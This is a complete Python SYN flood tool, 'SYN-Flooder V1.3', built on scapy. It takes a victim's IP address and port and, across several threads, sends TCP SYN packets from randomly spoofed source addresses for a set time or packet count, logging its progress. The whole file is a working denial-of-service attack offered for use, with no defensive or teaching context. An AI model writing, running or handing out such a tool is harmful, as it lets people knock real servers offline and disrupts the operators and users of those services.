#!/usr/bin/env python3

import argparse
import random
import time
import logging
from threading import Thread
from defaults import *
from scapy.all import send, IP, TCP


# Configure the logger
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s [%(levelname)s] %(message)s',
                    handlers=[logging.FileHandler("syn_flooder.log"), logging.StreamHandler()])
logger = logging.getLogger(__name__)


def random_ipv4_address() -> str:
    ipv4 = ".".join(map(str, (random.randint(0, 255)for _ in range(4))))
    return ipv4


def get_args() -> tuple:
    parser = argparse.ArgumentParser(
        description="Welcome to SYN-Flooder V1.3\n")
    parser.add_argument('x', help="Victims IPv4-address")
    parser.add_argument(
        '-a', type=int, help="Amount of packets (default are infinity)", default=DEFAULT_PACKETS)
    parser.add_argument(
        '-s', type=int, help="Time limit for attack (default is 60 seconds)", default=DEFAULT_TIME_LIMIT_IN_SECONDS)
    parser.add_argument(
        '-t', type=int, help="Threads (default is 1)", default=DEFAULT_THREADS)
    parser.add_argument(
        '-p', type=int, help="Destination Port (default is 80)", default=DEFAULT_DESTINATION_PORT)
    args = parser.parse_args()
    return args.x, args.p, args.t, args.a, args.s


def syn_flood_thread(target_ip: int, d_port: int, packets_to_send: int, time_limit: int):
    start_time = time.time()
    packets_sent = 0

    while packets_sent < packets_to_send and time.time() - start_time < time_limit:
        seq_n = random.randint(0, MAX_PORTS)
        s_port = random.randint(0, MAX_PORTS)
        window = random.randint(0, MAX_PORTS)
        src_ip = random_ipv4_address()
        packet = IP(dst=target_ip, src=src_ip)/TCP(sport=s_port,
                                                   dport=d_port, flags="S", seq=seq_n, window=window)
        send(packet, verbose=0)
        packets_sent += 1

        # Print feedback for every X packets sent
        if packets_sent % 100 == 0:
            elapsed_time = time.time() - start_time
            logger.info(
                f"Thread sent {packets_sent} packets in {elapsed_time:.2f} seconds.")
    
    elapsed_time = time.time() - start_time
    logger.info(f"Thread finished after {elapsed_time:.2f} seconds!")


def main():
    target_ip, d_port, number_of_threads, packets_to_send, time_limit = get_args()
    threads = []

    try:
        for _ in range(number_of_threads):
            thread: Thread = Thread(target=syn_flood_thread, args=(
                target_ip, d_port, packets_to_send, time_limit))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        logger.info("Interrupted by user. Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
